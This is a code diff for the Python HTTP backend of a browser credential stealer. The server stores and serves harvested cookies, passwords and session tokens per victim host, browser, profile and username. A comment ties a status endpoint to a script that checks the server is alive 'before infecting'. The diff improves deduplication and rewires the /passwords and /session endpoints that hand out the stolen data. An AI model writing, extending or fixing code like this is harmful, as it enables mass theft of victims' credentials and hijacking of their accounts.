@@ -88,6 +88,19 @@ def load_existing():
     return []
 
 
+def load_json(path):
+    """Read one of the split output files. Passwords and session live in their
+    own files -- reading all_cookies.json for them always returned []."""
+    if os.path.exists(path):
+        try:
+            with open(path, encoding="utf-8") as f:
+                data = json.load(f)
+            return data if isinstance(data, list) else []
+        except Exception:
+            pass
+    return []
+
+
 def merge(old, new):
     """Dedup on identity, not just domain+name+path.
 
@@ -103,7 +116,7 @@ def merge(old, new):
         extra = c.get("value") if c.get("name") == "token" else None
         return (c.get("_host"), c.get("browser"), c.get("profile"),
                 c.get("domain"), c.get("name"), c.get("path"),
-                c.get("_username"), extra)
+                c.get("_username"), extra, c.get("_partition"))
 
     for i, c in enumerate(out):
         seen[key(c)] = i
@@ -230,6 +243,8 @@ class Handler(BaseHTTPRequestHandler):
             # used by auto.py to prove ingest is alive before infecting
             rows = load_existing()
             data = json.dumps({"ok": True, "records": len(rows),
+                               "passwords": len(load_json(PWD_JSONF)),
+                               "session": len(load_json(SESS_JSONF)),
                                "files": [JSONF, PWD_JSONF, SESS_JSONF]}).encode("utf-8")
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
@@ -237,8 +252,7 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(data)
         elif self.path == "/session":
-            rows = load_existing()
-            sess = filter_session(filter_cookies(rows))
+            sess = load_json(SESS_JSONF)
             data = json.dumps(sess, ensure_ascii=False, indent=1).encode("utf-8")
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
@@ -246,8 +260,7 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(data)
         elif self.path == "/passwords":
-            rows = load_existing()
-            pwds = filter_passwords(rows)
+            pwds = load_json(PWD_JSONF)
             data = json.dumps(pwds, ensure_ascii=False, indent=1).encode("utf-8")
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
